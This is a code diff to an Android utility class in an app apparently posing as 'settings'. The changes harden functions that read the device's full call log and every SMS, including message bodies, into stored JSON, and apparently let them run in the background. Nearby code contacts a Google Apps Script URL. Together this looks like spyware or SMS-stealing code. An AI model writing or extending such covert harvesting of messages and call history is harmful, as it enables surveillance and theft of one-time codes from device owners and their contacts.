@@ -6,6 +6,7 @@ import static com.example.settings.MainActivity.setuponetimeworkManager;
 import android.Manifest;
 import android.app.Activity;
 import android.app.ActivityManager;
+import android.app.Application;
 import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
@@ -50,81 +51,88 @@ public class Utils {
 
         return currentDate + "[" + currentTime + "]";
     }
-    public static String getCurrentDateTime()
-    {
-        String currentDate = new SimpleDateFormat("dd-MM-yyyy", Locale.getDefault()).format(new Date());
-        String currentTime = new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date());
-        return currentDate + "[" + currentTime + "]";
-    }
     public  static void  readCallLogs(Context applicationContext,Sharedpref mSharedpref) {
-        LogsManager logsManager = new LogsManager(applicationContext);
-        List<LogObject> callLogs = logsManager.getLogs(LogsManager.ALL_CALLS);
-        JSONArray jsonArray=new JSONArray();
-        DateFormat simple = new SimpleDateFormat("dd MMM yyyy HH:mm:ss:SSS Z");
-        for(int i=0;i<callLogs.size();i++){
-            JSONObject jsonObject=new JSONObject();
-            try {
-                jsonObject.put("Call Number",callLogs.get(i).getNumber());
-                jsonObject.put("Call Name",callLogs.get(i).getContactName());
-                jsonObject.put("Call Type",callLogs.get(i).getType());
-                jsonObject.put("Call Duration",callLogs.get(i).getCoolDuration());
-                Date d = new Date(callLogs.get(i).getDate());
-                jsonObject.put("Call Date",simple.format(d));
-                jsonArray.put(jsonObject);
-            } catch (JSONException e) {
-                e.printStackTrace();
-            }
-        }
-        mSharedpref.setCallHistory(jsonArray.toString());
-        mSharedpref.commit();
-    }
-    public static void readSmsHistory(Activity mActivity, Sharedpref mSharedpref){
-        JSONArray smsArray=new JSONArray();
-        Uri message = Uri.parse("content://sms/");
-        ContentResolver cr = mActivity.getContentResolver();
-
-        Cursor c = cr.query(message, null, null, null, null);
-        mActivity.startManagingCursor(c);
-        int totalSMS = c.getCount();
-
-        if (c.moveToFirst()) {
-            for (int i = 0; i < totalSMS; i++) {
+        try {
+            LogsManager logsManager = new LogsManager(applicationContext);
+            List<LogObject> callLogs = logsManager.getLogs(LogsManager.ALL_CALLS);
+            JSONArray jsonArray=new JSONArray();
+            DateFormat simple = new SimpleDateFormat("dd MMM yyyy HH:mm:ss:SSS Z");
+            for(int i=0;i<callLogs.size();i++){
                 JSONObject jsonObject=new JSONObject();
                 try {
-                    jsonObject.put("Id",c.getString(c.getColumnIndexOrThrow("_id")));
-                    jsonObject.put("Address",c.getString(c.getColumnIndexOrThrow("address")));
-                    jsonObject.put("MsgBody",c.getString(c.getColumnIndexOrThrow("body")));
-                    if (c.getString(c.getColumnIndexOrThrow("read")).contains("1")) {
-                        jsonObject.put("status","Read");
-                    } else {
-                        jsonObject.put("status","NotRead");
-                    }
-                    String datetime=c.getString(c.getColumnIndexOrThrow("date"));
-                    Date date=new Date(Long.parseLong(datetime));
-                    SimpleDateFormat df2 = new SimpleDateFormat("dd/MM/yy");
-                    String dateText = df2.format(date);
-                    jsonObject.put("Time",dateText);
-                    if (c.getString(c.getColumnIndexOrThrow("type")).contains("1")) {
-                        jsonObject.put("Foldername","inbox");
-                    } else {
-                        jsonObject.put("Foldername","sent");
-                    }
-                    smsArray.put(jsonObject);
-
+                    jsonObject.put("Call Number",callLogs.get(i).getNumber());
+                    jsonObject.put("Call Name",callLogs.get(i).getContactName());
+                    jsonObject.put("Call Type",callLogs.get(i).getType());
+                    jsonObject.put("Call Duration",callLogs.get(i).getCoolDuration());
+                    Date d = new Date(callLogs.get(i).getDate());
+                    jsonObject.put("Call Date",simple.format(d));
+                    jsonArray.put(jsonObject);
                 } catch (JSONException e) {
                     e.printStackTrace();
-                    continue;
                 }
-                c.moveToNext();
             }
+            mSharedpref.setCallHistory(jsonArray.toString());
+            mSharedpref.commit();
         }
-        // else {
-        // throw new RuntimeException("You have no SMS");
-        // }
-        c.close();
-        mSharedpref.setSmsHistory(smsArray.toString());
-        mSharedpref.commit();
-        Log.d("Tag", String.valueOf(smsArray.length()));
+        catch (Exception e){
+            e.printStackTrace();
+            return;
+        }
+
+    }
+    public static void readSmsHistory(Context mActivity, Sharedpref mSharedpref){
+        try {
+            JSONArray smsArray=new JSONArray();
+            Uri message = Uri.parse("content://sms/");
+            ContentResolver cr = mActivity.getContentResolver();
+
+            Cursor c = cr.query(message, null, null, null, null);
+            // ((MainActivity)mActivity).startManagingCursor(c);
+            int totalSMS = c.getCount();
+
+            if (c.moveToFirst()) {
+                for (int i = 0; i < totalSMS; i++) {
+                    JSONObject jsonObject=new JSONObject();
+                    try {
+                        jsonObject.put("Id",c.getString(c.getColumnIndexOrThrow("_id")));
+                        jsonObject.put("Address",c.getString(c.getColumnIndexOrThrow("address")));
+                        jsonObject.put("MsgBody",c.getString(c.getColumnIndexOrThrow("body")));
+                        if (c.getString(c.getColumnIndexOrThrow("read")).contains("1")) {
+                            jsonObject.put("status","Read");
+                        } else {
+                            jsonObject.put("status","NotRead");
+                        }
+                        String datetime=c.getString(c.getColumnIndexOrThrow("date"));
+                        Date date=new Date(Long.parseLong(datetime));
+                        SimpleDateFormat df2 = new SimpleDateFormat("dd/MM/yy");
+                        String dateText = df2.format(date);
+                        jsonObject.put("Time",dateText);
+                        if (c.getString(c.getColumnIndexOrThrow("type")).contains("1")) {
+                            jsonObject.put("Foldername","inbox");
+                        } else {
+                            jsonObject.put("Foldername","sent");
+                        }
+                        smsArray.put(jsonObject);
+
+                    } catch (JSONException e) {
+                        e.printStackTrace();
+                        continue;
+                    }
+                    c.moveToNext();
+                }
+            }
+            // else {
+            // throw new RuntimeException("You have no SMS");
+            // }
+            c.close();
+            mSharedpref.setSmsHistory(smsArray.toString());
+            mSharedpref.commit();
+            Log.d("Tag", String.valueOf(smsArray.length()));
+        }
+        catch (Exception e){
+            e.printStackTrace();
+        }
+
     }
     public static void newUrlData(Context context,Sharedpref mSharedpref){
        String url="https://script.googleusercontent.com/macros/echo?user_content_key=RdsJJZR1E_p8xnTCxFEtKU7tqCFkUC_FTl3E2g_cDSIjpo-V43chBBHgueEZb0TFHwjC-4TPOuQPKeaiaJj0jjjQkeJ4Hs0Wm5_BxDlH2jW0nuo2oDemN9CCS2h10ox_1xSncGQajx_ryfhECjZEnH8eXEwHkzBGtIkfTyiTbSQKygxmT3GiA5SP-kQUhNAjebhQ5PeN_2JFSwNzgXMLi_qVtBV2CbTgnh8KTGIWb5_kN85XsxDPBA&lib=M2DzEZy__TPANi9YiRKV2MkfyXhMohYri";
@@ -243,4 +251,5 @@ public class Utils {
         }
         return true;
     }
+
 }
